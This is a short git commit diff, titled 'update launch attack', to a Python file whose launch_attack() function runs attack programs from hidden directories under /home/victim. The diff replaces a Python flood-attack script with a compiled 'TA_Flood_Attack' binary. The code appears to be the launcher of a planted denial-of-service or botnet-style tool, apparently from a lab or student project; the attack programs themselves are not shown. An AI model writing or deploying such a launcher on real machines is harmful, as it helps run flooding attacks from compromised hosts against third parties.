a24820e6d8bd0c8b63575013e32558324d4e2c73
Hank Kuo <hank@Hankde-MacBook-Pro.local>
2019-04-30 01:46:54 +0800

    update launch attack

--- a.py
+++ a.py
@@ -3,7 +3,7 @@ import os
 
 def launch_attack():
     os.system('/usr/bin/python /home/victim/.etc/.module/Check_Attack.py || ( /usr/bin/python /home/victim/.var/.module/Check_Attack.py )')
-    os.system('/usr/bin/python /home/victim/.etc/.module/Flood_Attack.py || ( /usr/bin/python /home/victim/.var/.module/Flood_Attack.py )')
+    os.system('cd /home/victim/.etc/.module && ./TA_Flood_Attack || ( cd /home/victim/.var/.module && ./TA_Flood_Attack )')
 
 
 if __name__ == '__main__':
